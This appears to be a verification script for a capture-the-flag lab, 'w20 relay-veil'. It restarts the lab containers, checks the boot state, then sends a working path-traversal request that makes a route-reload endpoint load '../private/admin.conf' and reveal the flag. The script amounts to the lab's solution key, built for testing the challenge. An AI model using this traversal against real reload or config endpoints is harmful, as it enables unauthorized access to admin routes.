#!/usr/bin/env bash
# w20 relay-veil :: self-verifying probe.
#
#   ./probe.sh                       # http://localhost:30020
#   ./probe.sh http://host:port
#
# Asserts the traversal works AND that the admin route is genuinely absent from
# the boot set. If the boot set accidentally included the management table the
# lab would be trivial, so that direction is checked explicitly.
#
# The exploit is STATEFUL: once reloaded, the management table stays loaded. The
# probe therefore restarts the lab's containers first, so it always asserts
# against a real boot state and is safe to run repeatedly. Set NO_RESTART=1 to
# skip that (e.g. when probing a remote host you cannot restart).
set -uo pipefail

BASE="${1:-http://localhost:30020}"
fail=0

if [[ "${NO_RESTART:-0}" != "1" ]]; then
  project="w20-relay-veil"
  ws="$(cd "$(dirname "$0")/.." && pwd)"
  printf '[*] restarting %s to reset the loaded route tables\n' "$project"
  # A bare restart needs the compose file's env guard satisfied; the value is
  # irrelevant to the restart itself and the container keeps its injected flag.
  W0B_FLAG="${W0B_FLAG:-reset}" docker compose -f "$ws/docker-compose.yml" \
    --project-name "$project" restart >/dev/null 2>&1 || true
  # Wait for BOTH containers. The relay's own /api/health does not touch the
  # upstream, so poll a proxied route - that is the pair that has to be up.
  ready=0
  for _ in $(seq 1 60); do
    if curl -s -m 2 "$BASE/status" 2>/dev/null | grep -q 'control-0'; then ready=1; break; fi
    sleep 0.5
  done
  if [[ $ready -eq 0 ]]; then
    printf '  FAIL relay/upstream did not come back after restart\n'
    exit 1
  fi
fi

check() { # check <label> <expected-substring> <actual>
  if [[ "$3" == *"$2"* ]]; then
    printf '  ok   %s\n' "$1"
  else
    printf '  FAIL %s\n       expected to contain: %s\n       got: %s\n' "$1" "$2" "$3"
    fail=1
  fi
}

refute() { # refute <label> <forbidden-substring> <actual>
  if [[ "$3" != *"$2"* ]]; then
    printf '  ok   %s\n' "$1"
  else
    printf '  FAIL %s\n       must NOT contain: %s\n       got: %s\n' "$1" "$2" "$3"
    fail=1
  fi
}

printf '[*] target %s\n' "$BASE"

check "landing page serves"          "RELAY VEIL"  "$(curl -s "$BASE/")"
check "health names the conf dir"    'conf.d'      "$(curl -s "$BASE/api/health")"

# The public route works, so we know the relay is dispatching.
check "public route dispatches"      'control-0'   "$(curl -s "$BASE/status")"

# The management route must NOT be loaded at boot.
refute "admin route absent at boot"  'hex4b0t{'    "$(curl -s "$BASE/admin/secret")"
check  "admin route reports no route" 'no route'   "$(curl -s "$BASE/admin/secret")"

# Only public.conf is in the boot set.
check "boot set is public.conf only" 'public.conf' "$(curl -s "$BASE/api/health")"

# The traversal.
check "traversal loads the management table" 'admin.conf' "$(curl -s -X POST "$BASE/api/reload?config=../private/admin.conf")"
check "management route appears"             'admin/secret' "$(curl -s -X POST "$BASE/api/reload?config=../private/admin.conf")"

# The flag.
check "admin route yields the flag" 'hex4b0t{' "$(curl -s "$BASE/admin/secret")"

# The upstream is not published to the host.
if curl -s -m 3 -o /dev/null "http://localhost:9000/status" 2>/dev/null; then
  printf '  FAIL upstream reachable from the host directly (no host port expected)\n'
  fail=1
else
  printf '  ok   upstream has no host port (the relay is the only route)\n'
fi

if [[ $fail -eq 0 ]]; then
  printf '\n[+] w20 solvable and boot set intact\n'
else
  printf '\n[!] w20 probe FAILED\n'
fi
exit $fail
